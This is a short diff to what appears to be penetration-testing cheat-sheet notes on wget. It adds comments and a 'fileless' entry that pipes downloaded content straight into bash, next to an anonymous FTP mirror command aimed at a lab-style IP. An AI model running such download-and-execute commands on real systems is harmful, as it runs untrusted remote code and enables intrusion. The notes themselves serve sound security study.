@@ -21,15 +21,18 @@ Download all available FTP files:
 wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
 ```
 
+Download a file.
 ```bash
 wget url -O path
 ```
 ^simple-download
 
-
+Download and execute file in memory (fileless).
 ```bash
-wget url -O path | bash
+wget -qO- url -O path | bash
 ```
+^fileless-download
+
 
 ### Category 2
 
